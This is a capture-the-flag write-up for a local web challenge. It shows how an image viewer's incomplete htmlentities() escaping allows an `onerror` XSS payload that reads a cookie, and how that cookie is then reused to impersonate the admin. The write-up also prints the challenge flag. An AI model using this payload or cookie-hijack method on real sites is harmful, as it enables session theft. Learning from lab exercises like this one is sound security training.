# Cookie Monster
Display use of XSS to steal cookies

<i>Creator - @Platy</i>

## Category
Web

## Question
>Cookie monster has stolen my cookies again! And apparently, he learnt how to create a website to get more cookies! He is accepting nice images from users and running it on his image viewer using what he thinks is the best browser, Internet Explorer. Retrieve the cookie he has that he stole from me! Thanks!
>
>Connect via `http://localhost:44444` and `nc localhost 44445`

### Hint
None.

## Distribution
None.

## Setup Guide
Run `bash start.sh` and do `docker start cookie`

## Solution
Upon going on to the website, we can see a nice image viewer. Whatever you placed in the input field, the image will get displayed.

We can try to do some simple XSS by doing `<script>alert(1);</script>` but nothing interesting happens.

Doing `Ctrl-U`, we can see
```html
<h1>HeRe Is YoUr ImAgE!</h1>
<img src='&lt;script&gt;alert(1);&lt;/script&gt;' width="500">
<p><h2>Thank you for using image viewer</h2></p>
<p>Image source : &lt;script&gt;alert(1);&lt;/script&gt;</p>
```

The tags get filtered out. But what's this? The img source uses single quotes instead of double. Perhaps single quotes are not filtered out by `htmlentities()` as it is not the default option

Typing in a single quote and we get this
```html
<img src=''' width="500">
```
Success! Now we know that single quotes are not sanitised. Since this is `<img src>`, we can do `onerror` to run javascript if the image fails to load.

By doing that, we can do `document.write()` with `document.cookie` to view Cookie Monster's cookies.

Upon entering  `' onerror='document.write(document.cookie)`, we get
```html
<html>
  <head></head>
  <body>passwordzzzzz=1_4m_z3_4dm1n_0f_z15_5173_pl3453_n0_h4ck_d4nk</body>
</html>
```
Now we can go into the console of chrome and type `document.cookie="passwordzzzzz=1_4m_z3_4dm1n_0f_z15_5173_pl3453_n0_h4ck_d4nk"`

We can now enter and pretend to be cookie monster to get the flag.

### Flag
`GCTF{c_15_f0r_c00k13_4nd_c00k13_15_f0r_m3}`

## Credits
None.

## Recommended Reads
None.
